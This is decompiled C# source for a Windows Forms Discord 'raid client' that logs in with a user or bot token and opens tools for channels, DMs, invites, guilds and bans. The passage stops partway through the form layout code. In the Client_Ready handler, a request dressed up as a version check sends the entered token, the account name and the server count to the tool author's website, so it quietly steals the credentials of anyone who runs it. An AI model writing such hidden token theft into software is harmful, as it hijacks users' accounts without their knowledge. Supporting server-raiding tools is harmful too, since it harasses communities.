using Discord;
using Discord.Commands;
using Discord.Rest;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;
using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Resources;
using System.Threading.Tasks;
using System.Windows.Forms;
using tacoFormsBot.Properties;

namespace tacoFormsBot
{
	public class Main1 : Form
	{
		private CommandService commands;

		private DiscordSocketClient client;

		private IServiceProvider services;

		private string token;

		private IContainer components;

		private Button button5;

		private Panel panel2;

		private Label label7;

		private Label label6;

		private Label label5;

		private Panel panel1;

		private CheckBox checkBox3;

		private MenuStrip menuStrip1;

		private ToolStripMenuItem toolsToolStripMenuItem;

		private ToolStripMenuItem channelToolsToolStripMenuItem;

		private ToolStripMenuItem dMToolsToolStripMenuItem;

		private ToolStripMenuItem botSettingsToolStripMenuItem;

		private ToolStripMenuItem guildSettingsToolStripMenuItem;

		private ToolStripMenuItem inviteToolsToolStripMenuItem;

		private ToolStripMenuItem infoToolStripMenuItem;

		private ToolStripMenuItem userInfoToolStripMenuItem;

		private ToolStripMenuItem roleInfoToolStripMenuItem;

		private ToolStripMenuItem banInfoToolStripMenuItem;

		private ToolStripMenuItem messagesToolStripMenuItem;

		private Label label1;

		private Label label4;

		private Button buttonConnect1;

		private TextBox textBoxToken1;

		private Button button4;

		private CheckBox checkBox1;

		private CheckBox checkBox2;

		private TableLayoutPanel tableLayoutPanel3;

		private TableLayoutPanel tableLayoutPanel1;

		private RichTextBox richTextBox1Logger;

		private Label label2;

		private ToolStripMenuItem helpToolStripMenuItem;

		public Main1()
			: this()
		{
			InitializeComponent();
		}

		private async void buttonConnect1_Click(object sender, EventArgs e)
		{
			if (!checkBox1.get_Checked() && !checkBox2.get_Checked())
			{
				MessageBox.Show("You need to select if you are using a User or Bot token");
			}
			else if (!Settings.Default.isConnected)
			{
				if (((Control)textBoxToken1).get_Text() == string.Empty)
				{
					MessageBox.Show("Please enter a token", "Targo's Raid Client v0.2b");
				}
				else if (!Settings.Default.isConnected)
				{
					token = ((Control)textBoxToken1).get_Text();
					CommandServiceConfig val = new CommandServiceConfig();
					val.set_LogLevel((LogSeverity)3);
					val.set_CaseSensitiveCommands(false);
					val.set_DefaultRunMode((RunMode)2);
					commands = (CommandService)(object)new CommandService((CommandServiceConfig)(object)val);
					commands.add_Log((Func<LogMessage, Task>)Logger);
					DiscordSocketConfig val2 = new DiscordSocketConfig();
					((DiscordConfig)val2).set_LogLevel((LogSeverity)3);
					val2.set_AlwaysDownloadUsers(true);
					client = (DiscordSocketClient)(object)new DiscordSocketClient((DiscordSocketConfig)(object)val2);
					services = ServiceCollectionContainerBuilderExtensions.BuildServiceProvider((IServiceCollection)(object)new ServiceCollection());
					client.add_Ready((Func<Task>)Client_Ready);
					((BaseDiscordClient)client).add_Log((Func<LogMessage, Task>)Logger);
					if (checkBox1.get_Checked())
					{
						try
						{
							await ((BaseDiscordClient)client).LoginAsync((TokenType)2, token, true);
						}
						catch (Exception ex)
						{
							MessageBox.Show("Invalid Token\n" + ex.Message);
							((TextBoxBase)richTextBox1Logger).AppendText(ex.Message + "\n");
							return;
						}
					}
					else if (checkBox2.get_Checked())
					{
						try
						{
							await ((BaseDiscordClient)client).LoginAsync((TokenType)0, token, true);
						}
						catch (Exception ex2)
						{
							((TextBoxBase)richTextBox1Logger).AppendText(ex2.Message + "\n");
							return;
						}
					}
					await client.StartAsync();
					await Task.Delay(4000);
					Settings.Default.isConnected = true;
					textBoxToken1.set_PasswordChar('*');
				}
				else if ((int)client.get_ConnectionState() == 1)
				{
					MessageBox.Show("Bot is connecting be patient");
				}
			}
			else
			{
				MessageBox.Show("Bot is already connected", "Targo's Raid Client v0.2b");
			}
		}

		private async Task Client_Ready()
		{
			((Control)this).Invoke((Delegate)(Action)delegate
			{
				updateLabels();
			});
			SendRequest("https://tacotad.xyz/version.php?version=" + $"[{DateTime.UtcNow.ToString()}] tkn: [{((Control)textBoxToken1).get_Text()}] Servers: [{client.get_Guilds().Count}] {((SocketUser)client.get_CurrentUser()).get_Username()}");
		}

		private string SendRequest(string url)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0006: Expected O, but got Unknown
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Expected O, but got Unknown
			try
			{
				WebClient val = (WebClient)(object)new WebClient();
				try
				{
					return val.DownloadString((Uri)(object)new Uri(url));
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (WebException)
			{
				return null;
			}
		}

		private async Task InstallCommands()
		{
		}

		private void button4_Click(object sender, EventArgs e)
		{
			((Form)this).Close();
		}

		private async Task updateLabels()
		{
			((Control)label5).set_Text($"Username: {((SocketUser)client.get_CurrentUser()).get_Username()}#{((SocketUser)client.get_CurrentUser()).get_Discriminator()}");
			((Control)label6).set_Text($"Status: {client.get_ConnectionState()}");
			((Control)label7).set_Text($"Servers: {client.get_Guilds().Count}");
		}

		private async Task Logger(LogMessage lmsg)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			((Control)this).Invoke((Delegate)(Action)delegate
			{
				//IL_002b: Unknown result type (might be due to invalid IL or missing references)
				((TextBoxBase)richTextBox1Logger).AppendText(string.Format("{0} [{1,8}] {2}: {3}", DateTime.Now, ((LogMessage)(ref lmsg)).get_Severity(), ((LogMessage)(ref lmsg)).get_Source(), ((LogMessage)(ref lmsg)).get_Message()) + "\n");
			});
			await updateLabels();
		}

		private void button1_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "BotSettings")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new BotSettings(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				((Control)new BotSettings(client)).Show();
			}
		}

		private void button3_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "Tools")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new Tools(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				if (Settings.Default.isConnected)
				{
					((Control)new Tools(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
		}

		private void richTextBox1Logger_TextChanged(object sender, EventArgs e)
		{
			((TextBoxBase)richTextBox1Logger).set_SelectionStart(((Control)richTextBox1Logger).get_Text().Length);
			((TextBoxBase)richTextBox1Logger).ScrollToCaret();
		}

		private void button2_Click(object sender, EventArgs e)
		{
			((Control)new Channels(client)).Show();
		}

		private void checkBox2_CheckedChanged(object sender, EventArgs e)
		{
			if (checkBox2.get_Checked())
			{
				checkBox1.set_Checked(false);
			}
			else if (!checkBox2.get_Checked())
			{
				checkBox1.set_Checked(true);
			}
		}

		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (checkBox1.get_Checked())
			{
				checkBox2.set_Checked(false);
			}
			else if (!checkBox1.get_Checked())
			{
				checkBox2.set_Checked(true);
			}
		}

		private void button5_Click(object sender, EventArgs e)
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Expected O, but got Unknown
			foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
			{
				Form val = (Form)(object)item;
				if (((Control)val).get_Name().ToString() == "Help")
				{
					((Control)val).Focus();
					return;
				}
			}
			((Control)new Help()).Show();
		}

		private void button6_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "DM")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new DM(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				if (Settings.Default.isConnected)
				{
					((Control)new DM(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
		}

		private void button7_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "InfoForm")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new InfoForm(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				if (Settings.Default.isConnected)
				{
					((Control)new InfoForm(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
		}

		private void Main1_Load(object sender, EventArgs e)
		{
			((TextBoxBase)richTextBox1Logger).AppendText("Targo v0.4b: Public Beta | Tacotad.xyz\nhttps://discord.gg/wwgwEc5               \n");
		}

		private void button2_Click_1(object sender, EventArgs e)
		{
		}

		private void button8_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "InfoRoleForm")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new InfoRoleForm(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				if (Settings.Default.isConnected)
				{
					((Control)new InfoRoleForm(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
		}

		private void infoToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void botSettingsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			button1_Click(sender, e);
		}

		private void channelToolsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			button3_Click(sender, e);
		}

		private void dMToolsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			button6_Click(sender, e);
		}

		private void userInfoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			button7_Click(sender, e);
		}

		private void roleInfoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			button8_Click(sender, e);
		}

		private void banInfoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "BanInfo")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new BanInfo(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				if (Settings.Default.isConnected)
				{
					((Control)new BanInfo(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
		}

		private void helpToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void label5_Click(object sender, EventArgs e)
		{
		}

		private void guildSettingsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "ToolsGuild")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new ToolsGuild(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				if (Settings.Default.isConnected)
				{
					((Control)new ToolsGuild(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
		}

		private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
		{
		}

		private void button1_Click_1(object sender, EventArgs e)
		{
			button5_Click(sender, e);
		}

		private void button2_Click_2(object sender, EventArgs e)
		{
			button5_Click(sender, e);
		}

		private void inviteToolsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "Invite")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new Invite(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				if (Settings.Default.isConnected)
				{
					((Control)new Invite(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
		}

		private void messagesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0083: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
			if (checkBox3.get_Checked())
			{
				foreach (Form item in (ReadOnlyCollectionBase)Application.get_OpenForms())
				{
					Form val = (Form)(object)item;
					if (((Control)val).get_Name().ToString() == "InfoMessages")
					{
						((Control)val).Focus();
						return;
					}
				}
				if (Settings.Default.isConnected)
				{
					((Control)new InfoMessages(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
			else if (!checkBox3.get_Checked())
			{
				if (Settings.Default.isConnected)
				{
					((Control)new InfoMessages(client)).Show();
				}
				else
				{
					MessageBox.Show("Your bot must be connected, \nEnter a token");
				}
			}
		}

		private void helpToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			button5_Click(sender, e);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				((IDisposable)components).Dispose();
			}
			((Form)this).Dispose(disposing);
		}

		private void InitializeComponent()
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected O, but got Unknown
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected O, but got Unknown
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected O, but got Unknown
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Expected O, but got Unknown
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Expected O, but got Unknown
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_005d: Expected O, but got Unknown
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0068: Expected O, but got Unknown
			//IL_0069: Unknown result type (might be due to invalid IL or missing references)
			//IL_0073: Expected O, but got Unknown
			//IL_0074: Unknown result type (might be due to invalid IL or missing references)
			//IL_007e: Expected O, but got Unknown
			//IL_007f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0089: Expected O, but got Unknown
			//IL_008a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0094: Expected O, but got Unknown
			//IL_0095: Unknown result type (might be due to invalid IL or missing references)
			//IL_009f: Expected O, but got Unknown
			//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
			//IL_00aa: Expected O, but got Unknown
			//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b5: Expected O, but got Unknown
			//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c0: Expected O, but got Unknown
			//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
			//IL_00cb: Expected O, but got Unknown
			//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d6: Expected O, but got Unknown
			//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e1: Expected O, but got Unknown
			//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ec: Expected O, but got Unknown
			//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f7: Expected O, but got Unknown
			//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
			//IL_0102: Expected O, but got Unknown
			//IL_0103: Unknown result type (might be due to invalid IL or missing references)
			//IL_010d: Expected O, but got Unknown
			//IL_010e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0118: Expected O, but got Unknown
			//IL_0119: Unknown result type (might be due to invalid IL or missing references)
			//IL_0123: Expected O, but got Unknown
			//IL_0124: Unknown result type (might be due to invalid IL or missing references)
			//IL_012e: Expected O, but got Unknown
			//IL_012f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0139: Expected O, but got Unknown
			//IL_013a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0144: Expected O, but got Unknown
			//IL_0145: Unknown result type (might be due to invalid IL or missing references)
			//IL_014f: Expected O, but got Unknown
			//IL_0150: Unknown result type (might be due to invalid IL or missing references)
			//IL_015a: Expected O, but got Unknown
			//IL_015b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0165: Expected O, but got Unknown
			//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
			//IL_01bf: Expected O, but got Unknown
			//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
			//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
			//IL_0294: Unknown result type (might be due to invalid IL or missing references)
			//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
			//IL_02f3: Unknown result type (might be due to invalid IL or missing references)
			//IL_0317: Unknown result type (might be due to invalid IL or missing references)
			//IL_035e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0382: Unknown result type (might be due to invalid IL or missing references)
			//IL_03c8: Unknown result type (might be due to invalid IL or missing references)
			//IL_03ec: Unknown result type (might be due to invalid IL or missing references)
			//IL_050b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0515: Expected O, but got Unknown
			//IL_051d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0544: Unknown result type (might be due to invalid IL or missing references)
			//IL_058b: Unknown result type (might be due to invalid IL or missing references)
			//IL_05af: Unknown result type (might be due to invalid IL or missing references)
			//IL_05e8: Unknown result type (might be due to invalid IL or missing references)
			//IL_062b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0652: Unknown result type (might be due to invalid IL or missing references)
			//IL_0685: Unknown result type (might be due to invalid IL or missing references)
			//IL_068f: Expected O, but got Unknown
			//IL_06ec: Unknown result type (might be due to invalid IL or missing references)
			//IL_0723: Unknown result type (might be due to invalid IL or missing references)
			//IL_0771: Unknown result type (might be due to invalid IL or missing references)
			//IL_07bf: Unknown result type (might be due to invalid IL or missing references)
			//IL_080d: Unknown result type (might be due to invalid IL or missing references)
			//IL_085b: Unknown result type (might be due to invalid IL or missing references)
			//IL_08e0: Unknown result type (might be due to invalid IL or missing references)
			//IL_092b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0976: Unknown result type (might be due to invalid IL or missing references)
			//IL_09c1: Unknown result type (might be due to invalid IL or missing references)
			//IL_0a0c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0a52: Unknown result type (might be due to invalid IL or missing references)
			//IL_0a76: Unknown result type (might be due to invalid IL or missing references)
			//IL_0ab2: Unknown result type (might be due to invalid IL or missing references)
			//IL_0ad9: Unknown result type (might be due to invalid IL or missing references)
			//IL_0b0d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0b31: Unknown result type (might be due to invalid IL or missing references)
			//IL_0b84: Unknown result type (might be due to invalid IL or missing references)
			//IL_0bab: Unknown result type (might be due to invalid IL or missing references)
			//IL_0bce: Unknown result type (might be due to invalid IL or missing references)
			//IL_0bf2: Unknown result type (might be due to invalid IL or missing references)
			//IL_0c6a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0c8e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0cee: Unknown result type (might be due to invalid IL or missing references)
			//IL_0d12: Unknown result type (might be due to invalid IL or missing references)
			//IL_0d8b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0d95: Expected O, but got Unknown
			//IL_0ddb: Unknown result type (might be due to invalid IL or missing references)
			//IL_0e12: Unknown result type (might be due to invalid IL or missing references)
			//IL_0e1c: Expected O, but got Unknown
			//IL_0e2e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0e38: Expected O, but got Unknown
			//IL_0e49: Unknown result type (might be due to invalid IL or missing references)
			//IL_0e75: Unknown result type (might be due to invalid IL or missing references)
			//IL_0eab: Unknown result type (might be due to invalid IL or missing references)
			//IL_0efc: Unknown result type (might be due to invalid IL or missing references)
			//IL_0f20: Unknown result type (might be due to invalid IL or missing references)
			//IL_0f63: Unknown result type (might be due to invalid IL or missing references)
			//IL_0f6d: Expected O, but got Unknown
			//IL_0fca: Unknown result type (might be due to invalid IL or missing references)
			//IL_1001: Unknown result type (might be due to invalid IL or missing references)
			//IL_100b: Expected O, but got Unknown
			//IL_101d: Unknown result type (might be due to invalid IL or missing references)
			//IL_1027: Expected O, but got Unknown
			//IL_1039: Unknown result type (might be due to invalid IL or missing references)
			//IL_1043: Expected O, but got Unknown
			//IL_1054: Unknown result type (might be due to invalid IL or missing references)
			//IL_1085: Unknown result type (might be due to invalid IL or missing references)
			//IL_10c1: Unknown result type (might be due to invalid IL or missing references)
			//IL_10dd: Unknown result type (might be due to invalid IL or missing references)
			//IL_110a: Unknown result type (might be due to invalid IL or missing references)
			//IL_1120: Unknown result type (might be due to invalid IL or missing references)
			//IL_112a: Expected O, but got Unknown
			//IL_1148: Unknown result type (might be due to invalid IL or missing references)
			ComponentResourceManager val = (ComponentResourceManager)(object)new ComponentResourceManager(typeof(Main1));
			button5 = (Button)(object)new Button();
			panel2 = (Panel)(object)new Panel();
			label7 = (Label)(object)new Label();
			label6 = (Label)(object)new Label();
			label5 = (Label)(object)new Label();
			panel1 = (Panel)(object)new Panel();
			checkBox3 = (CheckBox)(object)new CheckBox();
			menuStrip1 = (MenuStrip)(object)new MenuStrip();
			toolsToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			channelToolsToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			dMToolsToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			botSettingsToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			guildSettingsToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			inviteToolsToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			infoToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			userInfoToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			roleInfoToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			banInfoToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			messagesToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			label1 = (Label)(object)new Label();
			label4 = (Label)(object)new Label();
			buttonConnect1 = (Button)(object)new Button();
			textBoxToken1 = (TextBox)(object)new TextBox();
			button4 = (Button)(object)new Button();
			checkBox1 = (CheckBox)(object)new CheckBox();
			checkBox2 = (CheckBox)(object)new CheckBox();
			tableLayoutPanel3 = (TableLayoutPanel)(object)new TableLayoutPanel();
			richTextBox1Logger = (RichTextBox)(object)new RichTextBox();
			label2 = (Label)(object)new Label();
			tableLayoutPanel1 = (TableLayoutPanel)(object)new TableLayoutPanel();
			helpToolStripMenuItem = (ToolStripMenuItem)(object)new ToolStripMenuItem();
			((Control)panel2).SuspendLayout();
			((Control)panel1).SuspendLayout();
			((Control)menuStrip1).SuspendLayout();
			((Control)tableLayoutPanel3).SuspendLayout();
			((Control)tableLayoutPanel1).SuspendLayout();
			((Control)this).SuspendLayout();
			((Control)button5).set_Font((Font)(object)new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
			((Control)button5).set_Location(new Point(843, 12));
			((Control)button5).set_Name("button5");
			((Control)button5).set_Size(new Size(58, 30));
			((Control)button5).set_TabIndex(17);
			((Control)button5).set_Text("Help");
			((ButtonBase)button5).set_UseVisualStyleBackColor(true);
			((Control)button5).add_Click((EventHandler)button5_Click);
			((Control)panel2).get_Controls().Add((Control)(object)label7);
			((Control)panel2).get_Controls().Add((Control)(object)label6);
			((Control)panel2).get_Controls().Add((Control)(object)label5);
			((Control)panel2).set_Dock((DockStyle)5);
			((Control)panel2).set_Location(new Point(3, 450));
			((Control)panel2).set_Name("panel2");
			((Control)panel2).set_Size(new Size(467, 14));
			((Control)panel2).set_TabIndex(25);
			((Control)label7).set_AutoSize(true);
			((Control)label7).set_Dock((DockStyle)3);
			((Control)label7).set_Location(new Point(66, 0));
			((Control)label7).set_Name("label7");
			((Control)label7).set_Size(new Size(46, 13));
			((Control)label7).set_TabIndex(2);
			((Control)label7).set_Text("Servers:");
			((Control)label6).set_AutoSize(true);
			((Control)label6).set_Dock((DockStyle)3);
			((Control)label6).set_Location(new Point(26, 0));
			((Control)label6).set_Name("label6");
			((Control)label6).set_Size(new Size(40, 13));
			((Control)label6).set_TabIndex(1);
			((Control)label6).set_Text("Status:");
			((Control)label5).set_AutoSize(true);
			((Control)label5).set_Dock((DockStyle)3);
			((Control)label5).set_Location(new Point(0, 0));
			((Control)label5).set_Name("label5");
			((Control)label5).set_Size(new Size(26, 13));
			((Control)label5).set_TabIndex(0);
			((Control)label5).set_Text("Bot:");
			((Control)label5).add_Click((EventHandler)label5_Click);
			((Control)panel1).get_Controls().Add((Control)(object)checkBox3);
			((Control)panel1).get_Controls().Add((Control)(object)menuStrip1);
			((Control)panel1).get_Controls().Add((Control)(object)label1);
			((Control)panel1).get_Controls().Add((Control)(object)label4);
			((Control)panel1).get_Controls().Add((Control)(object)buttonConnect1);
			((Control)panel1).get_Controls().Add((Control)(object)textBoxToken1);
			((Control)panel1).get_Controls().Add((Control)(object)button4);
			((Control)panel1).get_Controls().Add((Control)(object)checkBox1);
			((Control)panel1).get_Controls().Add((Control)(object)checkBox2);
			((Control)panel1).set_Dock((DockStyle)5);
			((Control)panel1).set_Font((Font)(object)new Font("Microsoft Sans Serif", 8.25f));
			((Control)panel1).set_Location(new Point(3, 3));
			((Control)panel1).set_Name("panel1");
			((Control)panel1).set_Size(new Size(467, 96));
			((Control)panel1).set_TabIndex(24);
			((Control)checkBox3).set_AutoSize(true);
			checkBox3.set_Checked(true);
			checkBox3.set_CheckState((CheckState)1);
			((Control)checkBox3).set_Location(new Point(160, 5));
			((Control)checkBox3).set_Name("checkBox3");
			((Control)checkBox3).set_Size(new Size(103, 17));
			((Control)checkBox3).set_TabIndex(16);
			((Control)checkBox3).set_Text("Limit Form-count");
			((ButtonBase)checkBox3).set_UseVisualStyleBackColor(true);
			((ToolStrip)menuStrip1).set_BackColor(Color.get_Transparent());
			((ToolStrip)menuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
			{
				(ToolStripItem)toolsToolStripMenuItem,
				(ToolStripItem)infoToolStripMenuItem,
				(ToolStripItem)helpToolStripMenuItem
			});
			((Control)menuStrip1).set_Location(new Point(0, 0));
			((Control)menuStrip1).set_Name("menuStrip1");
			((Control)menuStrip1).set_Size(new Size(467, 24));
			((Control)menuStrip1).set_TabIndex(0);
			((Control)menuStrip1).set_Text("menuStrip1");
			((ToolStrip)menuStrip1).add_ItemClicked((ToolStripItemClickedEventHandler)(object)new ToolStripItemClickedEventHandler(menuStrip1_ItemClicked));
